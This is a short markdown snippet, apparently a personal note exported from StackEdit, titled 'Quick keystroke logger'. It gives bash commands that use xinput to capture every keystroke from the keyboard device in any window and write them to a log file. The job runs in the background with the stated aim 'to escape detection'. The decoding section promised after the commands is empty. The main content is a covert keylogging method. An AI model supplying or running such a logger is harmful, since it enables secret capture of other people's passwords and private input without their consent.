## Quick keystroke logger

```bash
xinput --list # then get id of keyboard
xinput --test $kybd_id > keystrokes.log & # send to bg to escape detection
```
This works for keystrokes on any window, not just the terminal in question.

To decode the logfile:

```bash

```
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTI4NTEwMDc1MF19
-->